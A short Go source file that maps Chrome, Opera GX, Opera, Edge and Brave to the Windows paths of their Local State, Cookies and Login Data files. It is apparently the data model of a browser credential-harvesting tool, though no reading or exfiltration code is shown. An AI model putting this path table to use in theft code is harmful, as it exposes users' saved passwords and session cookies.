package model

type BrowserPaths struct {
	Name        string
	ProductName string
	Pa          string
	Local       string
	Cookie      string
	Login       string
}

type BrowserType int

const (
	Chrome BrowserType = iota
	OperaGX
	OperaDefault
	Edge
	Brave
)

type Browser interface {
	GetPath() BrowserPaths
}

func GetChromePaths() BrowserPaths {
	return BrowserPaths{
		Name:        "Chrome",
		ProductName: "Google Chrome",
		Pa:          "\\AppData\\Local\\Google\\Chrome\\User Data",
		Local:       "\\AppData\\Local\\Google\\Chrome\\User Data\\Local State",
		Cookie:      "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
		Login:       "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
	}
}

func GetOperaGXPaths() BrowserPaths {
	return BrowserPaths{
		Name:        "OperaGX",
		ProductName: "Opera Browser",
		Pa:          "\\AppData\\Roaming\\Opera Software\\Opera GX Stable",
		Local:       "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local State",
		Cookie:      "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Cookies",
		Login:       "\\AppData\\Roaming\\Opera Software\\Opera GX Stable\\Login Data",
	}
}

func GetOperaDefaultPaths() BrowserPaths {
	return BrowserPaths{
		Name:        "Opera",
		ProductName: "Opera Browser",
		Pa:          "\\AppData\\Roaming\\Opera Software\\Opera Stable",
		Local:       "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Local State",
		Cookie:      "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Cookies",
		Login:       "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data",
	}
}

func GetEdgePaths() BrowserPaths {
	return BrowserPaths{
		Name:        "Edge",
		ProductName: "Microsoft Edge",
		Pa:          "\\AppData\\Local\\Microsoft\\Edge\\User Data",
		Local:       "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State",
		Cookie:      "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cookies",
		Login:       "\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data",
	}
}

func GetBravePaths() BrowserPaths {
	return BrowserPaths{
		Name:        "Brave",
		ProductName: "Brave Browser",
		Pa:          "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data",
		Local:       "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
		Cookie:      "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Cookies",
		Login:       "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
	}
}

type AllProfile struct {
	PathSource string
	UserData   string
	Version    string
	Alls       []string
}
